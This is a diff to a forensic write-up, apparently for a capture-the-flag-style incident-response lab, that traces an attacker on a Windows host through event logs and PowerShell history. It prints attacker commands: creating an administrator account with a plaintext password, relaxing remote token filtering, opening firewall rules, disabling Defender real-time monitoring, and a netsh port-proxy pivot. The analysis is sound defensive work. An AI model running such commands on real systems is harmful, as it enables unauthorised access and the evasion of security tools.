@@ -24,7 +24,7 @@ LeStrade passes a disk image artifacts to Watson. It's one of the identified bre
 **How it was found**:  
 Parsed the Windows Security event logs with Eric Zimmerman’s `EvtxECmd.exe` (exported to CSV) and loaded the CSV into Timeline Explorer. Filtering for **Event ID 4688** (Process Creation) and searching the `CommandLine` field for `cmd` revealed the sequence of commands executed by the attacker. The timeline shows the attacker used `WmiPrvSE.exe` to spawn `cmd.exe`; the first command after the initial `cd` was `systeminfo`.
 
-**Evidence (sanitized excerpt from parsed CSV / timeline)**:
+**Evidence: **
 ```text
 # command used to export EVTX -> CSV (used prior to analysis)
 EvtxECmd.exe -d "The_Enduring_Echo\The_Enduring_Echo\C\Windows\System32\winevt\logs" --csv . --csvf evtx.csv
@@ -210,7 +210,7 @@ if (-not $existing) {
 **How it was found:**  
 Timeline entries and parsed Event ID **4688** command lines show the attacker executed `proxy.bat`, which in turn called `netsh interface portproxy` to forward traffic. The `connectaddress` parameter in the `netsh` command indicates the internal target IP the attacker pivoted to — redacted here for privacy.
 
-**Evidence (sanitized / command excerpt):**
+**Evidence:**
 ```text
 # proxy.bat executed (sanitized)
 C:\Windows\System32\cmd.exe cmd.exe /Q /c .\proxy.bat 1> \\ATTACKER_IP_REDACTED\ADMIN$\__1756076432.886685 2>&1
@@ -260,5 +260,46 @@ The behavior of using a compromised host as an internal proxy to reach other int
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
 auditpol /set /subcategory:"Process Creation" /success:enable
 ```
-**How it was found / rationale:**  
-The behavior of using a compromised host as an internal proxy to reach other internal systems—is classified by MITRE ATT&CK as **Proxy: Internal Proxy**, which corresponds to **T1090.001**.
+**How it was found:**  
+Checked the PowerShell history file (ConsoleHost_history.txt) at The_Enduring_Echo\The_Enduring_Echo\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine and found commands related to enabling command‑line capture in the event logs.
+```
+ipconfig
+powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 172.18.6.3 -PrefixLength 24
+ipconfig.exe
+powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.129.233.246 -PrefixLength 24
+ipconfig
+ncpa.cpl
+ipconfig
+ping 1.1.1.1
+cd C:\Users\
+ls
+net user Werni Quantum1! /add
+ls
+net localgroup administrator Werni /add
+net localgroup Administrators Werni /add
+clear
+wmic computersystem where name="%COMPUTERNAME%" call rename name="Heisen-9-WS-6"
+ls
+cd ..
+ls
+cd .\Users\
+ls
+net users
+Rename-Conputer -NewName "Heisen-9-WS-6" -Force
+Rename-Computer -NewName "Heisen-9-WS-6" -Force
+net users
+ls
+net user felamos /delete
+cd ..
+ls
+net users
+cat .\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
+Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"
+Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
+auditpol /set /subcategory:"Process Creation" /success:enable
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled
+```
